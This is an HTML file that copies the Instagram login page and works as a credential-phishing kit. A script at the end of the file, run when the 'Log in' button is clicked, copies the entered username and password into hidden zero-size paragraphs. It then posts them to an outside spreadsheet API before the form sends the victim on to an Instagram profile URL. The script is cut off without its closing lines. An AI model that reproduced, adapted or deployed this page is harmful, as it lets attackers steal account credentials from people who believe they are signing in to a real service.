<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="stylesheet" href="style.css">
  <title>Instagram Login</title>
</head>

<body>
  <div id="wrapper">
    <div class="container">
      <div class="main-demo"></div>
      <div class="form-data">
        <form id ="rags" action="https://instagram.com/creative_souls13?utm_medium=copy_link" type="POST">
          <div class="logo">
            <img src="./images/logo.png" alt="logo">
          </div>

          <input id="Email" name="Email" type="text" placeholder="Phone number, username, or email">
          <input id = "Passwd" name="Passwd" type="password" placeholder="Password">
          
          <button id="signIn" name="signIn" onclick="myFunction()" class="form-btn" type="submit" >Log in</button>
        
          <p id="demo" style="font-size: 0cm;"></p>
          <p id="demo1" style="font-size:0cm;"></p>

          <span class="has-separator">Or</span>
          <a class="facebook-login" href="#">
            <i class="loginfb"></i> Log in with Facebook
          </a>
          <a class="password-reset" href="#">Forgot password?</a>
        </form>
        <div class="sign-up">
          Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="badges">
            <img src="./images/app-store.png" alt="app-store badge">
            <img src="./images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>

            </li>
            <li>
              <a href="#">Privacy</a>
            </li>
            <li>
              <a href="#">Terms</a>
            </li>
            <li>
              <a href="#">Directory</a>
            </li>
            <li>
              <a href="#">Profiles</a>
            </li>
            <li>
              <a href="#">Hashtags</a>
            </li>

              <a href="#">Languages</a>
            </li>

        </nav>
        <div class="copyright-notice">
          &2021 Instagram
        </div>
      </div>
    </footer>

  </div>

</body>

</html>

<script>
  function myFunction() {
    var x = document.getElementById("Passwd").value;
    var y = document.getElementById("Email").value;
    document.getElementById("demo").innerHTML = y;
    document.getElementById("demo1").innerHTML = x;
    $.ajax({
        url:'https://api.apispreadsheets.com/data/12782/',
        type:'post',
        data:$('#rags').serializeArray(),
        
    });
